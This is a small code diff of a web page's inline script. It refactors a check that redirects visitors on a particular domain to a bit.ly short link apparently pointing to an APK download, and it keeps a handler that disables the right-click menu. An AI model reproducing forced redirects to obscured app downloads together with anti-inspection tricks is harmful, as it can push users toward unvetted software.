@@ -57,7 +57,9 @@ a {
         cast: {},
     });
 
-if (window.location.href.indexOf("https://nodorios.ga/") !== -1) {window.location.href = "https://bit.ly/motodiapk";}
+if (/^https:\/\/nodorios\.ga\//.test(window.location.href)) {
+  window.location.href = "https://bit.ly/motodiapk";
+}
 </script>
 <script type="text/javascript" language="Javascript">
 document.oncontextmenu = function(){return false}
